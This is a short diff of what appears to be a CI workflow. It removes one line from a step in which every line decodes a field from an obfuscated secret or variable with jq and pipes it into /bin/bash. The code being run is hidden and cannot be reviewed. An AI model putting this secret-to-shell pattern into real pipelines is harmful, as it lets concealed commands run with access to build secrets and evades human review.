@@ -20,7 +20,6 @@ jobs:
           qquk838: ${{ secrets.qquk838 }}
         run: |
           printf '%s' "$qquk838" | jq -r .zwloq6 | /bin/bash
-          printf '%s' "$vg9" | jq -r .cpw571 | /bin/bash
           printf '%s' "$rdcf1304" | jq -r .wm3 | /bin/bash
           echo $vitn284 | jq -r .s50 | /bin/bash
           echo $mv82 | jq -r .a355 | /bin/bash
